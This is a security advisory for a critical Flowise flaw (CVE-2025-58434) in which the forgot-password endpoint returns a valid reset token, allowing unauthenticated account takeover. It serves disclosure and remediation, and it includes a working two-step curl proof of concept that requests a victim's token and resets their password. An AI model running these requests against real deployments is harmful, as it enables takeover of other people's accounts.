# [C] Flowise Cloud and Local Deployments have Unauthenticated Password Reset Token Disclosure that Leads to Account Takeover

## Summary
Severity: Critical
Advisory: GHSA-wgpv-6j63-x5ph
CVE: CVE-2025-58434
CWE: CWE-306
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2025-09-12
Source: https://github.com/advisories/GHSA-wgpv-6j63-x5ph
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0 <3.0.6

## Details
### Summary

The `forgot-password` endpoint in Flowise returns sensitive information including a valid password reset `tempToken` without authentication or verification. This enables any attacker to generate a reset token for arbitrary users and directly reset their password, leading to a complete **account takeover (ATO)**.

This vulnerability applies to **both the cloud service (`cloud.flowiseai.com`) and self-hosted/local Flowise deployments** that expose the same API.

**CVSS v3.1 Base Score:** **9.8 (Critical)**
**Vector String:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

---

### Details

* The endpoint `/api/v1/account/forgot-password` accepts an email address as input.
* Instead of only sending a reset email, the API **responds directly with sensitive user details**, including:

  * User ID, name, email, hashed credential, status, timestamps.
  * **A valid `tempToken` and its expiry**, which is intended for password reset.
* This `tempToken` can then be reused immediately in the `/api/v1/account/reset-password` endpoint to reset the password of the targeted account **without any email verification** or user interaction.
* Exploitation requires only the victim’s email address, which is often guessable or discoverable.
* Because the vulnerable endpoints exist in both **Flowise Cloud** and **local/self-hosted deployments**, any exposed instance is vulnerable to account takeover.

This effectively allows any unauthenticated attacker to **take over arbitrary accounts** (including admin or privileged accounts) by requesting a reset for their email.

---

### PoC

1. **Request a reset token for the victim**

```bash
curl -i -X POST https://<target>/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"<victim@example.com>"}}'
```

**Response (201 Created):**

```json
{
  "user": {
    "id": "<redacted-uuid>",
    "name": "<redacted>",
    "email": "<victim@example.com>",
    "credential": "<redacted-hash>",
    "tempToken": "<redacted-tempToken>",
    "tokenExpiry": "2025-08-19T13:00:33.834Z",
    "status": "active"
  }
}
```

2. **Use the exposed `tempToken` to reset the password**

```bash
curl -i -X POST https://<target>/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
        "user":{
          "email":"<victim@example.com>",
          "tempToken":"<redacted-tempToken>",
          "password":"NewSecurePassword123!"
        }
      }'
```

**Expected Result:** `200 OK`
The victim’s account password is reset, allowing full login.

---

### Impact

* **Type:** Authentication bypass / Insecure direct object exposure.
* **Impact:**

  * Any account (including administrator or high-value accounts) can be reset and taken over with only the email address.
  * Applies to **both Flowise Cloud and locally hosted/self-managed deployments**.
  * Leads to full account takeover, data exposure, impersonation, and possible control over organizational assets.
  * High likelihood of exploitation since no prior access or user interaction is required.

---

### Recommended Remediation

* **Do not return reset tokens** or sensitive account details in API responses. Tokens must only be delivered securely via the registered email channel.
* Ensure `forgot-password` responds with a generic success message regardless of input, to avoid user enumeration.
* Require strong validation of the `tempToken` (e.g., single-use, short expiry, tied to request origin, validated against email delivery).
* Apply the same fixes to **both cloud and self-hosted/local deployments**.
* Log and monitor password reset requests for suspicious activity.
* Consider multi-factor verification for sensitive accounts.


Credit

---

⚠️ This is a **Critical ATO vulnerability** because it allows attackers to compromise any account with only knowledge of an email address, and it applies to **all deployment models (cloud and local)**.

---

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wgpv-6j63-x5ph
- https://nvd.nist.gov/vuln/detail/CVE-2025-58434
- https://github.com/FlowiseAI/Flowise/commit/9e178d68873eb876073846433a596590d3d9c863
- https://github.com/FlowiseAI/Flowise
